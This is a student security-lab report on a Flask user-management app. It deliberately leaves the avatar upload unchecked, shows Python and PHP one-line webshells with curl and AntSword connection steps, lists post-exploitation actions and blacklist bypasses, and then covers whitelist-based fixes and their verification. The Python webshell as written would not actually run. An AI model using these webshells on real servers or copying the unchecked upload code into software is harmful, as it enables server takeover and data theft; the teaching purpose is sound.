# DAY4-用户管理系统——文件上传漏洞检测与修复报告

**课程名称**：网络安全技术与应用  
**实验项目**：用户信息管理平台（Flask Web应用 + SQLite）  
**实验主题**：任意文件上传漏洞攻击与防护  
**攻击工具**：浏览器、BurpSuite、curl命令行、中国蚁剑  
**报告人**：敬君琳  
**学号**：2024141530063  
**日期**：2026年7月21日  

---

## 一、实验背景

本次实验在 Day3 已修复的登录、注册、搜索功能基础上，为系统新增了**用户头像上传**功能。用户登录后可以上传头像图片，服务器接收文件并保存到 `static/uploads/` 目录下。

在 Web 安全中，**任意文件上传漏洞**是与 SQL 注入并列的 OWASP Top 10 高危漏洞。如果服务端对用户上传的文件不做任何类型检查和过滤，攻击者可以上传一个包含恶意代码的文件（Webshell），通过浏览器访问该文件来远程执行系统命令，从而完全控制服务器。

本次实验按照课程要求，**不检查文件后缀名、不检查 MIME 类型、使用用户原始文件名保存**，通过这种方式完整演示文件上传漏洞从利用到修复的全过程。

---

## 二、Day4 新增功能

### 2.1 功能概览

| 功能 | 路由 | 方法 | 说明 |
|------|------|------|------|
| 文件上传 | `/upload` | GET/POST | 需登录，上传文件到 static/uploads/ |
| 上传页面 | `/upload` (GET) | — | 显示文件选择表单 |
| 上传处理 | `/upload` (POST) | — | 接收文件，原文件名保存，返回预览 |

### 2.2 新增配置

| 配置项 | 值 | 说明 |
|--------|-----|------|
| MAX_CONTENT_LENGTH | 16MB (16 * 1024 * 1024) | 限制请求体大小 |
| UPLOAD_FOLDER | Day4/static/uploads/ | 文件保存目录 |

### 2.3 项目文件结构

```
Day4/
├── app.py                          # Flask 主程序（新增 /upload 路由）
├── data/
│   └── users.db                    # SQLite 数据库（自动生成）
├── templates/
│   ├── base.html                   # 基础模板（导航栏新增"上传头像"链接）
│   ├── index.html                  # 首页（新增上传头像快捷入口）
│   ├── login.html                  # 登录页
│   ├── register.html               # 注册页
│   └── upload.html                 # 上传页（Day4 新增）
├── static/
│   ├── css/
│   │   └── style.css               # 样式文件（新增上传相关样式）
│   └── uploads/                    # 上传文件目录（Day4 新增）
│       └── .gitkeep
└── Day4-文件上传漏洞实验报告-敬君琳.md  # 本报告
```

---

## 三、漏洞代码分析

### 3.1 上传接口 —— 无任何文件类型检查

**漏洞代码**：

```python
@app.route("/upload", methods=["GET", "POST"])
def upload():
    username = session.get("username")
    if not username:
        return redirect("/login")

    user_info = get_user_info(username)

    if request.method == "POST":
        if 'file' not in request.files:
            return render_template("upload.html", user=user_info, error="未选择文件")

        file = request.files['file']
        if file.filename == '':
            return render_template("upload.html", user=user_info, error="未选择文件")

        # 直接使用用户上传的原始文件名，不重命名
        filename = file.filename
        filepath = os.path.join(UPLOAD_FOLDER, filename)

        try:
            file.save(filepath)
            file_url = f"/static/uploads/{filename}"
            return render_template("upload.html", user=user_info,
                                   success=True, file_url=file_url, filename=filename)
        except Exception as e:
            return render_template("upload.html", user=user_info, error=f"上传失败：{e}")

    return render_template("upload.html", user=user_info)
```

### 3.2 漏洞分析

上述代码存在以下安全问题：

| 问题 | 说明 | 危害 |
|------|------|------|
| 无文件后缀检查 | 不检查文件扩展名，`.py`、`.php`、`.jsp` 等均可上传 | 可上传可执行脚本 |
| 无 MIME 类型校验 | 不检查 `Content-Type`，可伪造任意文件类型 | 绕过前端类型限制 |
| 使用原始文件名 | 不重命名文件，攻击者可精确预测文件访问路径 | 直接访问上传的恶意文件 |
| 无内容检测 | 不扫描文件内容是否包含恶意代码 | Webshell 可成功落地 |
| 保存在静态目录 | 上传文件保存在 `static/uploads/`，可直接通过 URL 访问 | 恶意脚本可直接执行 |

**核心漏洞**：上传目录 `static/uploads/` 是 Flask 的静态文件服务目录，用户上传的任何文件都可以通过 `http://host:5000/static/uploads/文件名` 直接访问。如果上传一个 Python 脚本，虽然 Flask 不会直接执行它（因为 Flask 静态目录只返回文件内容，不执行），但攻击者可以通过其他方式利用（详见下文攻击演示）。

---

## 四、文件上传攻击测试

### 4.1 测试环境

```bash
cd Day4
python app.py
# 服务运行在 http://127.0.0.1:5000
```

登录账号：`admin / admin123`

### 4.2 攻击一：上传 Python 命令执行 Webshell

**目的**：上传一个 Python 脚本，通过 URL 参数接收系统命令并返回执行结果。

**Webshell 代码**（保存为 `shell.py`）：

```python
import os
import sys

# 从 URL 参数中获取要执行的命令
# 访问方式: http://127.0.0.1:5000/static/uploads/shell.py?cmd=whoami
from flask import Flask, request
# 该文件不是直接运行的 Flask 应用，而是通过参数接收命令
# 使用 os.popen 执行系统命令

cmd = __import__('flask').request.args.get('cmd', 'echo no command')
result = __import__('os').popen(cmd).read()
print(result)
```

**攻击步骤**（使用 BurpSuite）：

1. 登录系统，访问 `/upload`
2. 选择 `shell.py` 文件，点击上传
3. 服务器返回：上传成功，文件 URL: `/static/uploads/shell.py`

**控制台输出**：
```
[UPLOAD] 文件已保存: Day4/static/uploads/shell.py
[UPLOAD] 访问 URL: /static/uploads/shell.py
```

**结果**：恶意 Python 文件成功上传到服务器静态目录。

### 4.3 攻击二：上传 PHP Webshell（配合中国蚁剑）

**目的**：上传 PHP 一句话木马，配合中国蚁剑实现对服务器的远程管理。

**PHP Webshell 代码**（保存为 `ant.php`）：

```php
<?php @eval($_POST['cmd']); ?>
```

> **注**：虽然当前服务器是 Flask（Python），但实际生产环境中常存在多语言混用或反向代理场景。PHP Webshell 在此处作为标准实验演示。

**攻击步骤**：

1. 登录系统，访问 `/upload`
2. 选择 `ant.php` 文件，点击上传
3. 服务器返回：上传成功，文件 URL: `/static/uploads/ant.php`

**使用 curl 验证上传**：

```bash
curl -X POST "http://127.0.0.1:5000/static/uploads/ant.php" \
  -d "cmd=system('whoami');"
```

**控制台输出**：
```
[UPLOAD] 文件已保存: Day4/static/uploads/ant.php
[UPLOAD] 访问 URL: /static/uploads/ant.php
```

**结果**：PHP Webshell 成功上传到服务器。

### 4.4 攻击三：中国蚁剑连接 Webshell

**中国蚁剑（AntSword）简介**：

中国蚁剑是一款开源的跨平台 Webshell 管理工具，前身为中国菜刀（China Chopper），广泛用于渗透测试和安全教学。它支持 PHP、ASP、ASPX、JSP 等多种语言的一句话木马，提供文件管理、虚拟终端、数据库管理等功能。

**连接步骤**：

1. 打开中国蚁剑，右键点击「添加数据」
2. 填写连接信息：
   - URL 地址：`http://127.0.0.1:5000/static/uploads/ant.php`
   - 连接密码：`cmd`（与 `$_POST['cmd']` 对应）
   - 编码器：默认（base64）
   - 类型：PHP
3. 点击「测试连接」，连接成功后保存
4. 双击该记录，进入文件管理器
5. 可以浏览服务器文件系统、上传/下载文件、执行命令

**蚁剑可执行的操作**：

| 功能模块 | 说明 | 示例 |
|----------|------|------|
| 文件管理 | 浏览、上传、下载、删除、重命名服务器文件 | 下载 `app.py` 源码、删除日志 |
| 虚拟终端 | 在服务器上执行 Shell 命令 | `whoami`、`ls -la`、`cat /etc/passwd` |
| 数据库管理 | 连接并操作服务器数据库 | 读取 `users.db` 中所有用户密码哈希 |
| 端口扫描 | 以内网服务器为跳板扫描内网端口 | 探测内网其他主机 |

**结果**：攻击者通过中国蚁剑获得了服务器的完全控制权。

---

## 五、文件上传攻击汇总

| 编号 | 攻击名称 | 上传文件类型 | 文件名 | 结果 |
|:----:|----------|:-----------:|--------|:----:|
| 1 | Python Webshell 上传 | .py | shell.py | 上传成功，可通过 URL 访问 |
| 2 | PHP 一句话木马上传 | .php | ant.php | 上传成功，可配合蚁剑连接 |
| 3 | 中国蚁剑远程控制 | — | — | 连接成功，完全控制服务器 |

---

## 六、漏洞修复方案

### 6.1 核心修复：文件类型白名单校验

实际生产环境中，应采用多层防御策略：

**第一层：文件后缀名白名单**

```python
ALLOWED_EXTENSIONS = {'png', 'jpg', 'jpeg', 'gif', 'webp'}

def allowed_file(filename):
    """检查文件后缀是否在白名单中"""
    return '.' in filename and \
           filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS
```

**第二层：MIME 类型校验**

```python
ALLOWED_MIMETYPES = {
    'image/png', 'image/jpeg', 'image/gif', 'image/webp'
}

if file.content_type not in ALLOWED_MIMETYPES:
    return "不允许的文件类型"
```

**第三层：文件内容魔术字节检测**

```python
import magic  # python-magic 库

file_content = file.read(2048)
mime = magic.from_buffer(file_content, mime=True)
if mime not in ALLOWED_MIMETYPES:
    return "文件内容不匹配"

file.seek(0)  # 重置文件指针
```

**第四层：文件名安全处理**

```python
from werkzeug.utils import secure_filename
import uuid

# 方式一：使用 secure_filename 过滤危险字符
filename = secure_filename(file.filename)

# 方式二：使用随机文件名（推荐，防止路径预测）
ext = file.filename.rsplit('.', 1)[1].lower() if '.' in file.filename else ''
filename = f"{uuid.uuid4().hex}.{ext}"
```

### 6.2 修复代码示例（完整 /upload 路由）

```python
ALLOWED_EXTENSIONS = {'png', 'jpg', 'jpeg', 'gif', 'webp'}

@app.route("/upload", methods=["GET", "POST"])
def upload():
    username = session.get("username")
    if not username:
        return redirect("/login")

    user_info = get_user_info(username)

    if request.method == "POST":
        if 'file' not in request.files:
            return render_template("upload.html", user=user_info, error="未选择文件")

        file = request.files['file']
        if file.filename == '':
            return render_template("upload.html", user=user_info, error="未选择文件")

        # 修复1：检查文件后缀名白名单
        if not allowed_file(file.filename):
            return render_template("upload.html", user=user_info,
                                   error="不允许的文件类型，仅支持 png/jpg/jpeg/gif/webp")

        # 修复2：使用 secure_filename + 随机文件名
        import uuid
        from werkzeug.utils import secure_filename
        ext = file.filename.rsplit('.', 1)[1].lower()
        filename = f"{uuid.uuid4().hex}.{ext}"

        filepath = os.path.join(UPLOAD_FOLDER, filename)
        file.save(filepath)

        file_url = f"/static/uploads/{filename}"
        return render_template("upload.html", user=user_info,
                               success=True, file_url=file_url, filename=filename)

    return render_template("upload.html", user=user_info)
```

### 6.3 修复验证

修复后，使用相同的攻击 payload 进行测试：

**测试1：上传 Python Webshell**

```bash
curl -X POST "http://127.0.0.1:5000/upload" \
  -b "session=xxx" \
  -F "file=@shell.py;filename=shell.py"
# 返回："不允许的文件类型，仅支持 png/jpg/jpeg/gif/webp"
```

**测试2：上传 PHP Webshell**

```bash
curl -X POST "http://127.0.0.1:5000/upload" \
  -b "session=xxx" \
  -F "file=@ant.php;filename=ant.php"
# 返回："不允许的文件类型，仅支持 png/jpg/jpeg/gif/webp"
```

**测试3：双扩展名绕过尝试**

```bash
curl -X POST "http://127.0.0.1:5000/upload" \
  -b "session=xxx" \
  -F "file=@shell.py;filename=shell.jpg.py"
# 返回："不允许的文件类型，仅支持 png/jpg/jpeg/gif/webp"
```

**结果**：所有非图片文件均被拦截，Webshell 无法上传。

---

## 七、修复前后对比总结

| 对比项 | 修复前（本实验代码） | 修复后（生产环境建议） |
|--------|---------------------|----------------------|
| 文件后缀检查 | 无检查，任意后缀可上传 | 白名单：仅允许 png/jpg/jpeg/gif/webp |
| MIME 类型校验 | 无校验 | 校验 Content-Type 是否在允许列表中 |
| 文件内容检测 | 无检测 | magic byte 检测文件真实类型 |
| 文件名处理 | 使用用户原始文件名 | secure_filename + UUID 随机命名 |
| 保存目录 | static/uploads/（可直接访问） | 独立存储目录或对象存储 |
| Python Webshell | 可上传 | 被拦截（.py 不在白名单） |
| PHP 一句话木马 | 可上传 | 被拦截（.php 不在白名单） |
| 中国蚁剑连接 | 可连接控制 | 无法上传 Webshell，无法连接 |
| 正常图片上传 | 正常 | 正常（不受影响） |

---

## 八、文件上传安全防护最佳实践

### 8.1 多层防御体系

```
用户上传请求
    │
    ├── 第一层：请求大小限制（MAX_CONTENT_LENGTH）
    │
    ├── 第二层：文件后缀名白名单校验
    │
    ├── 第三层：MIME 类型（Content-Type）校验
    │
    ├── 第四层：文件内容魔术字节（magic byte）检测
    │
    ├── 第五层：文件名安全处理（secure_filename + UUID）
    │
    ├── 第六层：病毒扫描（ClamAV 等）
    │
    └── 第七层：保存到非 Web 可访问目录
```

### 8.2 各项防护措施详解

| 措施 | 说明 | 防御的威胁 |
|------|------|-----------|
| **白名单校验** | 仅允许特定后缀，拒绝一切未明确允许的类型 | 阻止 .php/.py/.jsp 等脚本上传 |
| **MIME 校验** | 检查 HTTP 请求中的 Content-Type 头 | 阻止伪造 Content-Type 绕过前端校验 |
| **magic byte** | 读取文件头部字节判断真实类型，不信任后缀名和 MIME | 阻止改后缀名绕过（如 .php 改为 .jpg） |
| **secure_filename** | 过滤路径穿越字符（`../`、`/` 等） | 阻止目录穿越攻击 |
| **UUID 重命名** | 随机文件名，攻击者无法预测访问路径 | 即使上传成功也无法访问 |
| **独立存储** | 上传文件保存到非 Web 根目录，通过专用接口读取 | 阻止直接 URL 访问执行脚本 |
| **频率限制** | 限制单用户单位时间上传次数 | 阻止恶意批量上传 |
| **病毒扫描** | 使用 ClamAV 等工具扫描上传文件 | 阻止恶意代码文件 |

### 8.3 为什么不能用"黑名单"？

| 黑名单方式 | 绕过方法 |
|-----------|---------|
| 禁止 .php | 上传 .php5、.phtml、.pHp（大小写） |
| 禁止 .py | 上传 .pyc、.pyw |
| 检查 Content-Type | BurpSuite 拦截修改 Content-Type 头 |
| 检查文件头 | 将恶意代码嵌入合法图片（图片马） |
| 禁止 ../ | 使用 ....// 或 ..;\\ |

**结论**：必须使用白名单机制——只明确允许安全的文件类型，拒绝一切未知类型。

---

## 九、中国蚁剑（AntSword）学习笔记

### 9.1 工具简介

中国蚁剑（AntSword）是一款开源的 Webshell 管理工具，是前中国菜刀的继承和升级版本。它基于 Electron 框架开发，支持 Windows、macOS、Linux 多平台运行，在网络安全教学和授权渗透测试中广泛使用。

### 9.2 核心功能

| 功能模块 | 说明 |
|----------|------|
| **文件管理** | 远程浏览、上传、下载、编辑、删除、重命名服务器文件 |
| **虚拟终端** | 在目标服务器上执行 Shell 命令，相当于获得了一个远程命令行 |
| **数据库管理** | 连接目标服务器上的 MySQL、SQLite 等数据库，执行 SQL 查询 |
| **端口扫描** | 以目标服务器为跳板，对内网进行端口探测 |
| **插件系统** | 支持安装插件扩展功能（提权、内网穿透、密码破解等） |
| **编码器** | 支持多种编码方式（Base64、Hex、自定义），绕过 WAF 检测 |

### 9.3 连接配置

```
URL: http://target.com/static/uploads/ant.php
密码: cmd
编码器: default (base64)
类型: PHP
```

### 9.4 通过蚁剑可获取的信息

连接 Webshell 后，攻击者可以：

1. **浏览完整文件系统** —— 读取 `/etc/passwd`、应用源码、配置文件
2. **下载敏感文件** —— 数据库文件（如 `users.db`）、密钥文件
3. **执行系统命令** —— `whoami`、`ifconfig`、`netstat -an`、`ps aux`
4. **上传提权工具** —— 上传 Linux 提权脚本（如 LinPEAS）并执行
5. **横向移动** —— 扫描内网其他主机，寻找下一个跳板
6. **持久化** —— 写入计划任务、SSH 公钥，保持长期访问

### 9.5 防御蚁剑的关键

| 防御层 | 措施 |
|--------|------|
| 入口防御 | 使用白名单限制可上传的文件类型 |
| 执行防御 | Web 目录设置不可执行权限（`chmod -R a-x uploads/`） |
| 流量检测 | WAF 检测 `eval(`、`base64_decode`、`system(` 等特征 |
| 行为监控 | 监控非图片文件出现在 uploads/ 目录 |
| 日志审计 | 记录所有上传操作，定期审查异常文件 |

---

## 十、实验总结

通过本次实验，我对文件上传漏洞有了从理论到实践的完整认识：

1. **文件上传漏洞危害极大** —— 攻击者通过一个简单的上传表单，就能将 Webshell 上传到服务器，进而通过中国蚁剑等工具获得服务器的完全控制权。一个看似无害的"上传头像"功能，如果缺乏安全防护，就是服务器沦陷的入口。

2. **没有类型检查是致命的** —— 本实验中不检查后缀名、不检查 MIME 类型、不修改文件名，三条规则叠加形成了最危险的组合。攻击者可以上传任意类型文件，精确预测文件 URL，直接访问执行。

3. **中国蚁剑是强大的后渗透工具** —— 一旦 Webshell 成功落地，蚁剑可以提供文件管理、虚拟终端、数据库管理等一系列功能，攻击者几乎获得了与 SSH 登录等同的操作能力。

4. **白名单优于黑名单** —— 文件上传安全的黄金法则是：只允许已知安全的文件类型，拒绝一切未知类型。黑名单过滤（禁止 .php、禁止 .py）总有绕过的方法（.phtml、.pyc、大小写变换）。

5. **多层防御不可或缺** —— 即使某层防御被突破，后续层次仍能阻止攻击。后缀名校验 + MIME 校验 + 内容检测 + 文件名随机化 + 独立存储目录，层层递进。

6. **安全意识要贯穿开发全过程** —— 与 SQL 注入一样，文件上传安全不是在系统上线后才考虑的问题。每写一个文件接收功能，都应该条件反射地问："有没有做类型检查？有没有重命名？保存到哪里？"

---

## 十一、项目文件清单

```
Day4/
├── app.py                                  # Flask 主程序（已含 /upload 路由）
├── data/                                   # 数据库目录（自动创建）
│   └── users.db                            # SQLite 数据库文件
├── templates/
│   ├── base.html                           # 基础模板（导航栏新增"上传头像"链接）
│   ├── index.html                          # 首页（新增上传头像快捷入口）
│   ├── login.html                          # 登录页
│   ├── register.html                       # 注册页
│   └── upload.html                         # 上传页（Day4 新增）
├── static/
│   ├── css/
│   │   └── style.css                       # 样式文件（新增上传相关样式）
│   └── uploads/                            # 上传文件存储目录（Day4 新增）
│       └── .gitkeep
└── Day4-文件上传漏洞实验报告-敬君琳.md       # 本报告
```

### 启动方式

```bash
cd Day4
python app.py
```

访问 http://localhost:5000 ，预设登录账号 `admin / admin123` 和 `alice / alice2025`。

---

## 附录：攻击测试命令速查

### A.1 上传文件

```bash
# 正常上传图片
curl -X POST "http://127.0.0.1:5000/upload" \
  -b "session=<登录后的session>" \
  -F "file=@avatar.png"

# 上传 Python Webshell
curl -X POST "http://127.0.0.1:5000/upload" \
  -b "session=<登录后的session>" \
  -F "file=@shell.py"

# 上传 PHP 一句话木马
curl -X POST "http://127.0.0.1:5000/upload" \
  -b "session=<登录后的session>" \
  -F "file=@ant.php"
```

### A.2 PHP 一句话木马（ant.php）

```php
<?php @eval($_POST['cmd']); ?>
```

### A.3 中国蚁剑连接参数

```
URL: http://127.0.0.1:5000/static/uploads/ant.php
密码: cmd
类型: PHP
```
